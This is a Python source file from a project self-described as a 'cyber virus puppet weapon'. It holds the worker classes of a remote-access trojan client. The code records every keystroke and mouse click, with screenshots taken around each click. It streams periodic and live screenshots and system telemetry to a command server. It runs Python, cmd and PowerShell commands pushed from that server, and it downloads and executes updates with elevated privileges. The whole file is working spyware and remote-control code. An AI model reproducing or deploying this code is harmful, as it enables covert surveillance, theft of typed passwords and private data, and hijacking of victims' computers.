# -*- Config : UTF-8 -*-
# Project Name: Termination Generally Use Cyber Virus Puppet Weapons - TLhread/Thread_TWNTWork
# Version: 4.2.0
# Build Version: ./TConfig/version.ini
# Author: Veyra
# Description:

# TWNT Work work program.

from TLib import *
from TLhread import *
from TLib.T_imports import *


class MonitorWorker(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit'):
        self.master=master
        self.TWNT=TWNT
        self.desc = "Monitor HardWare Process"
        self.SleepTime: int = 5
        self.AddEditor("SleepTime", "SleepTime", "int")
        self.__init_func__()
    def __init_func__(self):
        while not self.ShouldStop():
            if self.TWNT.IsConnected: self.SendData()
            time.sleep(self.SleepTime)
    def SendData(self):
            try:
                cpu = psutil.cpu_percent(interval = 1)
                cpu_core = psutil.cpu_count(logical = True)
                mem = psutil.virtual_memory()
                net_sent, net_recv=self.GetNetworkUsage()
                if self.TWNT.IsConnected:
                    self.TWNT.emit("T4Monitor",
                              PCMachineGUID = self.TWNT.PCMachineGUID,
                              monitor = {
                                  "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
                                  "cpu": {"usage": cpu, "core": cpu_core},
                                  "mem": {"percent": mem.percent, "total": mem.total, "used": mem.used},
                                  "net": {"sent": net_sent / 1024, "recv": net_recv / 1024}
                            })
            except Exception as e:
                self.logger.Error(T_Std.ErrorFormat(e, "Monitor ERROR"))
    def GetNetworkUsage(self, interval = 1):
        net1 = psutil.net_io_counters()
        time.sleep(interval)
        net2 = psutil.net_io_counters()
        sent = (net2.bytes_sent - net1.bytes_sent) / interval
        recv = (net2.bytes_recv - net1.bytes_recv) / interval
        return sent, recv

class ListenKMWorker(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit',
            DeltaX: int = 40, DeltaY: int = 40, WaitTimes: int = 0, SleepTime: float = 60.0,
            Level: int = 10, SendKMCount: int = 5000, WaitTimesMax: int = 10):
        self.master: 'Termination4.Termination' = master
        self.TWNT: 'Thread_TWNT.TWNetworkTransit' = TWNT
        self.desc: str = "Listen Key & Mouse Process"
        self.record: list = []
        self.DeltaX: int = DeltaX
        self.DeltaY: int = DeltaY
        self.WaitTimes: int = WaitTimes
        self.SleepTime: float = SleepTime
        self.Level: int = Level
        self.SendKMCount: int = SendKMCount
        self.WaitTimesMax: int = WaitTimesMax
        self.AddEditor("DeltaX", "DeltaX", "float")
        self.AddEditor("DeltaY", "DeltaY", "float")
        self.AddEditor("WaitTimes", "WaitTimes", "int")
        self.AddEditor("SleepTime", "SleepTime", "float")
        self.AddEditor("Level", "Level", "int")
        self.AddEditor("SendKMCount", "SendKMCount", "int")
        self.AddEditor("WaitTimesMax", "WaitTimesMax", "int")
        self.__init_func__()
        self.__init_send__()
    def __init_func__(self):
        self.logger.Info("Setup Listen Key & Mouse Process")
        def OnKey(key):
            self.record.append(str(key.char if hasattr(key, "char") else key))
        def OnClick(x, y, button, pressed):
            self.record.append(
                {"I":[x, y],
                 "K":"L" if pynput.mouse.Button.left == button else "R",
                 "A": "P" if pressed else "R",
                 "M":
                 f"data:image/jpeg;base64,{base64.b64encode(r["ImageBytes"]).decode("utf-8")}" if (r:=self.master.WindowsScreenCapture.CaptureAndCompressScreenshot(
                     self.Level,
                     *sum(self.master.WindowsScreenCapture.AdjustCoordinatesAdvanced(
                         (x, y),
                         (0, 0),
                         (self.master.WindowsScreenCapture.X, self.master.WindowsScreenCapture.Y),
                         self.DeltaX, self.DeltaY
                         ), ())
                     )
                    ) else ""
                }
            )
        self.Thread_Key: threading.Thread   = threading.Thread(target=lambda: pynput.keyboard.Listener(on_press=OnKey).start())
        self.Thread_Mouse: threading.Thread = threading.Thread(target=lambda: pynput.mouse.Listener(on_click=OnClick).start())
        self.Thread_Key.start()
        self.Thread_Mouse.start()
    def __init_send__(self):
        while True:
            if len(self.record) < self.SendKMCount: self.WaitTimes+=1
            if self.TWNT.IsConnected and self.record and (len(self.record) > self.SendKMCount or self.WaitTimes > self.WaitTimesMax):
                try: self.TWNT.emit("T4KM", PCMachineGUID = self.TWNT.PCMachineGUID, record = json.dumps(self.record))
                except Exception as e: return self.logger.Error(T_Std.ErrorFormat(e, "Send KM Error"))
                self.record=[]
                self.WaitTimes=0
            time.sleep(self.SleepTime)
    def SendNow(self):
        if self.TWNT.IsConnected and self.record:
            try: self.TWNT.emit("T4KM", PCMachineGUID = self.TWNT.PCMachineGUID, record = json.dumps(self.record))
            except Exception as e: self.logger.Error(T_Std.ErrorFormat(e, "Send KM Error"))
            self.record=[]
            self.WaitTimes=0
            return self.logger.Success("The Upload Was Successful")
        self.logger.Error("!CONNECTED OR !RECORD")

class TWNTProcessSynchronousWorker(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit', SleepTime: float = 30.0):
        self.master: 'Termination4.Termination' = master
        self.TWNT: 'Thread_TWNT.TWNetworkTransit' = TWNT
        self.desc: str = f"TWNT Process Synchronous"
        self.SleepTime: float = SleepTime
        self.AllInfo: bool = False
        self.AddEditor("SleepTime", "SleepTime", "float")
        self.AddEditor("AllInfo", "AllInfo", "bool")
        while not self.ShouldStop():
            if TWNT.IsConnected: self.ProcessSynchronous()
            time.sleep(self.SleepTime)
    def ProcessSynchronous(self):
        p: list[dict[str: typing.Any]] = []
        for i in self.master.TProcessManager.GetAllThreads():
            _: T_Process.TProcess = self.master.TProcessManager.GetThread(i)
            p.append({
                "name": i,
                "description": _.desc,
                "progress": _.progress,
                "default": {i["key"]: getattr(_, i["key"], None) for i in _.editor} if self.AllInfo else {},
                "editor": _.editor if self.AllInfo else []
                })
        q: list[dict[str: typing.Any]] = []
        for i in self.master.Mp_TProcessManager.GetAllProcesses():
            _: T_Process.Mp_TProcess = self.master.Mp_TProcessManager.GetProcess(i)
            q.append({
                "name": i,
                "description": _.desc,
                "progress": _.progress,
                "default": {i["key"]: getattr(_, i["key"], None) for i in _.editor},
                "editor": _.editor if self.AllInfo else []
                })
        self.TWNT.emit("T4Thread", PCMachineGUID = self.TWNT.PCMachineGUID, process = p)
        self.TWNT.emit("T4Process", PCMachineGUID = self.TWNT.PCMachineGUID, process = q)

class TWNTCoverScreen(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit', SleepTime: float = 120.0):
        self.master: 'Termination4.Termination' = master
        self.desc: str = f"Cover Screen"
        self.TWNT: 'Thread_TWNT.TWNetworkTransit' = TWNT
        self.ECode: int = 0
        self.SleepTime: float = SleepTime
        self.AddEditor("SleepTime", "SleepTime", "float")
        self.AddEditor("ECode", "ECode", "int")
        while not self.ShouldStop():
            if TWNT.IsConnected: self.UploadScreenshot()
            time.sleep(self.SleepTime)
    def UploadScreenshot(self):
        TWNT = self.TWNT
        if TWNT.IsConnected and (ssb:=self.master.WindowsScreenCapture.CaptureAndCompressScreenshot(TWNT.Level)):
            r: requests.Response = requests.post(f"{TWNT.PATFile['X']}://{TWNT.PATFile['Host']}/TAPI/cover.api", files={"screen": (".gkbd", TWNT.GodKeys.encrypt(ssb["ImageBytes"]))}, data={"PCMachineGUID": TWNT.PCMachineGUID}, verify=False)
            if (int(r.status_code) != 200 or r.text != "OK") and self.ECode <= 10:
                self.logger.Debug(f"Cover Update State: Code: {r.status_code} Text: {r.text}")
                self.ECode += 1

class TWNTRealTimeScreen(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit', Level: int = 15, SleepTime: float = 1.0, PCMachineGUID: str = ""):
        try:
            self.Level: int = int(Level)
            self.SleepTime: float = float(SleepTime)
        except:
            self.logger.Error("Real-Time Screen: Bad Int")
            return
        self.desc: str = f"Real-Time Screen, Level: {self.Level}"
        self.Sleep: float = self.SleepTime
        self.AddEditor("Level", "Level", "int")
        self.AddEditor("SleepTime", "SleepTime", "float")
        while not self.ShouldStop() and TWNT.IsConnected:
            self.screenshot: dict[str: typing.Any] = master.WindowsScreenCapture.CaptureAndCompressScreenshot(self.Level)
            self.screenshot["PCMachineGUID"] = PCMachineGUID
            self.screenshot["CreateTime"] = time.time()
            TWNT.emit("T4RealTimeScreen", self.screenshot)
            time.sleep(self.Sleep)

class TWNESynchronousTProcess(T_Process.TProcess):
    def Run(self, TWNT: 'Thread_TWNT.TWNetworkTransit', SleepTime: float = 10.0):
        self.TWNT: 'Thread_TWNT.TWNetworkTransit' = TWNT
        self.desc = "Tell Server: Maintain A State Of Survival"
        self.SleepTime = SleepTime
        self.ServerSynchronizationTime: float = 0.0
        self.ServerSynchronizationTimeData: float | str | bytes = 0.0
        self.BootTime: int = time.time()
        self.DisconnectCount: int = 0
        self.SyncCount: int = 0
        self._AllowDifference_ConnectTime: int = 20
        self._AllowDifference_ServerSynchronizationTime: int = 30
        self._AllowDifference_BootTime: int = 60
        self.AddEditor("SleepTime", "SleepTime", "float")
        while True:
            self.SyncCount += 1
            self.SynchronousTSignal()
            time.sleep(self.SleepTime)
    def SynchronousTSignal(self):
        if self.TWNT.IsConnected:
            try: self.TWNT.emit("T4Synchronous", PCMachineGUID = self.TWNT.PCMachineGUID)
            except:
                self.logger.Info("Server Not Survival In SynchronousTSignal", False)
                try: self.TWNT._disconnect()
                except: self.logger.Error("Failed To Send Synchronous Message")

class TWNEUpdateApp(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', FileURL: str = ""):
        self.desc: str = "CMD: Update"
        if master.WorkMod == "py": return self.logger.Info("In The Python Mode!")
        self.logger.Info("Download Update...")
        self.UUID: str = GUUID()
        self.TerminationBin: str = os.path.join(os.getenv("temp"), f"{self.UUID}.tmp")
        self.AddEditor("UUID", "UUID", "str")
        self.AddEditor("TerminationBin", "TerminationBin", "str")
        try:
            _: requests.Response = requests.get(FileURL, stream=True, verify=False)
            TotalSize: int = int(_.headers.get('content-length', 0))
            DownloadedSize: int = 0
            with open(self.TerminationBin, 'wb') as f:
                self.logger.Info("Donwload Update Bin...")
                for chunk in _.iter_content(chunk_size=1024*4):
                    if chunk:
                        f.write(chunk)
                        DownloadedSize += len(chunk)
                        self.progress = int((DownloadedSize / TotalSize) * 100)
            r: requests.Response = requests.get(f"{master.TWNT.PATFile['X']}://{master.TWNT.PATFile['Host']}/TAPI/SHA256.api", verify=False, timeout=10)
            if int(r.status_code) == 200:
                if master.tpll.GetFileSha256(self.TerminationBin) != r.text:
                    master.TWNT.Updating=False
                    return self.logger.Error("SHA256 Error!")
        except Exception as e:
            master.TWNT.Updating = False
            return self.logger.Error(T_Std.ErrorFormat(e, "Update Error"))
        else: self.logger.Success("DownLoaded")
        if not os.path.exists(self.TerminationBin): return self.logger.Error("Not Exists")
        if TotalSize == 0 or os.path.getsize(self.TerminationBin) != TotalSize:
            self.logger.Error("GetSize != TotalSite, Deleted")
            master.TWNT.Updating = False
            os.remove(self.TerminationBin)
            return
        master.Thread_AutoRun.stop()
        master.__uninit_lock__()
        master.__init_elevate__([master.PEBinary_Update, "20", self.TerminationBin, master.__file__], me=False, sleep=0, show_console=False, protect=False)

class Thread_Test(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', start: int = 0, stop: int = 10000, step: int = 1):
        self.desc = "CMD: Test"
        for i in range(start, stop, step):
            self.logger.Info(i)
            time.sleep(1)

class Thread_CmdThread(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit', cmd: str):
        self.desc = f"Popen: {cmd}"
        self.cmd = cmd
        self.AddEditor("cmd", "cmd", "str", [])
        self._stop_event = threading.Event()
        self.process = subprocess.Popen(
            shlex.split(self.cmd),
            shell=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            text=True,
            encoding='gbk',
            errors='replace'
        )
        try:
            while not self._stop_event.is_set() and self.process.poll() is None:
                output = self.process.stdout.readline()
                if output: self.logger.Info(output.strip())
                time.sleep(0.1)
            time.sleep(2)
        finally:
            if self.process and self.process.poll() is None:
                self._Handle_Stop()
    def _Handle_Stop(self):
        try:
            self.process.terminate()
            self.process.wait(timeout=1)
            self.process.kill()
        except subprocess.TimeoutExpired:
            self.process.kill()

class TWNETProcess(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit', data):
        self.master = master
        self.TWNT = TWNT
        self.MappingTable: list[typing.Callable] = {
            "Python": self.Handle_Python,
            "Cmd": self.Handle_Cmd,
            "PowerShell": self.Handle_PowerShell,
            "ThreadINFO": self.Handle_ThreadINFO,
            "ProcessINFO": self.Handle_ProcessINFO,
            "ThreadKill": self.Handle_ThreadKill,
            "ProcessKill": self.Handle_ProcessKill,
            "ThreadRevise": self.Handle_ThreadRevise,
            "GetL3T": self.Handle_GetL3T,
            "AddL3T": self.Handle_AddL3T,
            "ChangeL3T": self.Handle_ChangeL3T,
            "DelL3T": self.Handle_DelL3T,
            "Screenshot": self.Handle_Screenshot,
            "Update": self.Handle_Update,
            "RealTimeScreen": self.Handle_RealTimeScreen,
            "KillRealTimeScreen": self.Handle_KillRealTimeScreen,
            "GetLog": self.Handle_GetLog,
            "KMSendNow": self.Handle_KMSendNow,
        }
        self.data = data
        self.desc = "Started By The Command Line"
        self.__init_func__()
    def __init_func__(self):
        self.logger.Info(f"Thread-Data: {self.data}")
        if "work" in self.data:
            try:
                if self.data["work"] not in self.MappingTable:
                    self.logger.Error("Not Knowing How Work")
                    return
                self.MappingTable[self.data["work"]]()
            except Exception as e:
                if self.TWNT.IsConnected: self.TWNT.emit("T4Message", PCMachineGUID = self.TWNT.PCMachineGUID, Error = T_Std.ErrorJsonConverter.ConvertToJson(e))
                self.logger.Error(T_Std.ErrorFormat(e, "TWNETProcess __init_work__ Error"), Echo=False)
    def Handle_Python(self):
        self.desc = "CMD: Run Python Command"
        exec(self.data["Command"], self.master.WorkENV)
    def Handle_Cmd(self):
        self.desc = "CMD: Run Cmd Command"
        _ = Thread_CmdThread(self.master, self.TWNT, self.data["Command"])
        self.master.TProcessManager.AddThread(_)
        _.start()
    def Handle_PowerShell(self):
        self.desc = "CMD: Run PowerShell Command"
        self.Popen = subprocess.Popen(
            "powershell -Command " + self.data["Command"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
            encoding='gbk',
            errors='replace'
        )
        for line in self.Popen.stdout: self.logger.Info(line.strip())
        self.Popen.wait()
    def Handle_ReSystemINFO(self):
        self.desc = "CMD: Re System INFO"
        self.TWNT.emit("T4ReSystemINFO", PCMachineGUID = self.TWNT.PCMachineGUID, PCSystemINFO = json.dumps(Thread_TWNT.GetWindowsSystemINFO()))
    def Handle_ThreadINFO(self):
        self.desc = "CMD: Thread Scanning"
        self.TWNT.Thread_TWNTProcessSynchronousWorker.ProcessSynchronous()
    def Handle_ThreadKill(self):
        self.desc = "CMD: ThreadKill"
        self.master.TProcessManager.KillThread(self.data["Command"])
    def Handle_ThreadRevise(self):
        self.desc = "CMD: ThreadRevise"
        if "TaskName" not in self.data["Command"]: self.logger.Error("TaskName not in data.Command")
        if "FormData" not in self.data["Command"]: self.logger.Error("FormData not in data.Command")
        if not (t:=self.master.TProcessManager.GetThread(self.data["Command"]["TaskName"])): self.logger.Error("GetThread TaskName Is None")
        for i in self.data["Command"]["FormData"]:
            if not getattr(t, i, None):
                self.logger.Error(f"Thread {self.data['Command']['TaskName']} not have {i}")
                continue
            if getattr(t, f"Handle_{i}", None):
                exec(f"t.Handle_{i}(v)", {"t": t, "v": self.data["Command"]["FormData"][i]})
            setattr(t, i, self.data["Command"]["FormData"][i])
    def Handle_ProcessINFO(self):
        self.desc = "CMD: Process Scanning"
        self.TWNT.Thread_TWNTProcessSynchronousWorker.ProcessSynchronous()
    def Handle_ProcessKill(self):
        self.desc = "CMD: ProcessKill"
        self.master.Mp_TProcessManager.KillProcess(self.data["Command"])
    def Handle_ProcessRevise(self):
        self.desc = "CMD: ProcessRevise"
        if "TaskName" not in self.data["Command"]: self.logger.Error("TaskName not in data.Command")
        if "FormData" not in self.data["Command"]: self.logger.Error("FormData not in data.Command")
        if not (t := self.master.Mp_TProcessManager.GetThread(self.data["Command"]["TaskName"])): self.logger.Error("GetThread TaskName Is None")
        for i in self.data["Command"]["FormData"]:
            if not getattr(t, i, None):
                self.logger.Error(f"Thread {self.data['Command']['TaskName']} not have {i}")
                continue
            if getattr(t, f"Handle_{i}", None):
                exec(f"t.Handle_{i}(v)", {"t": t, "v": self.data["Command"]["FormData"][i]})
            setattr(t, i, self.data["Command"]["FormData"][i])
    def Handle_GetL3T(self):
        self.desc = "CMD: Read L3T"
        #r=[]
        #l=self.master.L3T.read()
        #for i in l:
        #    p=self.master.L3T.get(i)
        #    p["TaskUUID"]=i
        #    r.append(p)
        self.TWNT.emit("T4L3T", PCMachineGUID = self.TWNT.PCMachineGUID, L3T = list(self.master.Thread_LW3T.L3T.read().values()))
    def Handle_AddL3T(self):
        self.desc = "CMD: Add L3T"
        k=GUUID()
        v=self.data["Command"]
        v["TaskUUID"]=k
        if self.master.Thread_LW3T.insert(k, v): self.logger.Success("Insertion Is Successful")
        else: self.logger.Error("Insertion Failed")
        self.TWNT.emit("T4L3TRELOAD", PCMachineGUID = self.TWNT.PCMachineGUID)
    def Handle_ChangeL3T(self):
        self.desc = "CMD: Change L3T"
        if self.master.Thread_LW3T.change(self.data["Command"]["TaskUUID"], self.data["Command"]): self.logger.Success("Modification Is Successful")
        else: self.logger.Error("Monification Failed")
        self.TWNT.emit("T4L3TRELOAD", PCMachineGUID = self.TWNT.PCMachineGUID)
    def Handle_DelL3T(self):
        self.desc = "CMD: Del L3T"
        if self.master.Thread_LW3T.remove(self.data["Command"]): self.logger.Success("Deleted Is Successful")
        else: self.logger.Error("Deleted Failed")
        self.TWNT.emit("T4L3TRELOAD", PCMachineGUID = self.TWNT.PCMachineGUID)
    def Handle_Screenshot(self):
        self.desc = "CMD: Screenshot"
        ssb=self.master.KeMouse.ScreenshotBytes()
        r = requests.post(f"{self.TWNT.PATFile['X']}://{self.TWNT.PATFile['Host']}/TAPI/scrht.api", files={"screen": (".gkbd", self.TWNT.GodKeys.encrypt(ssb))}, data={"PCMachineGUID": self.TWNT.PCMachineGUID}, verify=False)
        self.logger.Success(f"ScreenShot Update State: Code: {r.status_code} Text: {r.text}")
        # self.TWNT.emit("T4Screenshot", PCMachineGUID = self.TWNT.PCMachineGUID, PNG = self.master.KeMouse.ScreenshotBytes())
    def Handle_Update(self):
        self.desc = "CMD: Update"
        self.logger.Debug("Start To Update.")
        UBUF=TWNEUpdateApp(self.master, self.data["Command"])
        self.master.TProcessManager.AddThread(UBUF)
        UBUF.start()
    def Handle_RealTimeScreen(self):
        self.desc = "CMD: RealTimeScreen"
        if self.TWNT.Thread_RealTimeScreen: self.TWNT.Thread_RealTimeScreen.Stop()
        level=self.data["Command"]["level"]
        sleep=self.data["Command"]["sleep"]
        self.TWNT.Thread_RealTimeScreen=TWNTRealTimeScreen(self.master, self.TWNT, level, sleep, self.TWNT.PCMachineGUID)
        self.master.TProcessManager.AddThread(self.TWNT.Thread_RealTimeScreen)
        self.TWNT.Thread_RealTimeScreen.start()
    def Handle_RealTimeScreenStop(self):
        self.desc = "CMD: RealTimeScreen"
        if self.TWNT.Thread_RealTimeScreen:
            self.TWNT.Thread_RealTimeScreen.Stop()
    def Handle_KillRealTimeScreen(self):
        self.desc = "CMD: KillRealTimeScreen"
        if self.TWNT.Thread_RealTimeScreen:
            self.TWNT.Thread_RealTimeScreen.Stop()
        self.TWNT.Thread_RealTimeScreen=None
    def Handle_GetLog(self):
        self.desc = "CMD: GetLog"
        try: self.TWNT.emit("T4Log",
                                PCMachineGUID = self.TWNT.PCMachineGUID,
                                Log = self.master.tpll.ReadFileRangeFromEnd(
                                      self.master.__log_path__, self.data["Command"][0],
                                      self.data["Command"][1],
                                      self.data["Command"][3] if len(self.data["Command"]) == 3 else 1024
                                )
                          )
        except Exception as e:
            self.logger.Error(T_Std.ErrorFormat(e, "GetLog Error"))
    def Handle_KMSendNow(self):
        self.desc = "CMD: KMSendNow"
        self.TWNT.Thread_ListenKMWorker.SendNow()
